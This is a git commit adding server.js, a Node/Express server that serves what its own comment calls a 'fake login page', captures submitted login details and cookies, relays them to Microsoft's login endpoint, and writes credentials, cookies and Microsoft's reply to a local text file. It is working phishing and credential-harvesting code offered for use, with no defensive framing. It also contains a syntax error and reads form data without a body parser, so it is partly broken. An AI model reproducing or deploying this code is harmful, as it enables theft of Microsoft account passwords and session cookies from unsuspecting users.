9724b0985fec9d498abc7c7fe30890a7b25ad043
Rex <akpoyibofortune@gmail.com>
2025-01-08 12:48:14 +0100

    Add files via upload

---
+++ server.js
@@ -0,0 +1,30 @@
+const express = require('express');
+const path = require('path');
+const app = express();
+const axios = require('axios');
+const fs = require('fs'):
+
+// Serve index.html when the root URL is accessed
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'myfile.html')); // Send the fake login page
+});
+
+// Capture form submissions from index.html
+app.post('/login', (req, res) => {
+    let submittingData = `Login Details: ${JSON.stringify(req.body)}`;
+    let submittingCokies = `Cookies: ${req.headers.cookie}`;
+    
+
+    // Forward data to Microsoft's server
+    axios.post('https://login.microsoftonline.com/common/login', req.body, {
+        headers: { 'Cookie': req.headers.cookie },
+    })
+    .then(response => {
+        const respon = 'Microsoft Response:'  + JSON.stringify(response.data);
+        fs.appendFileSync(`${submittingData.substring(0, 15)}.txt`, submittingData + '\n' + submittingCokies +  '\n' + respon );
+        res.send(response.data); // Send Microsoft's response back to the user
+    })
+    .catch(err => res.status(500).send('Error'));
+});
+
+app.listen(8080, () => console.log('Server running on port 8080'));
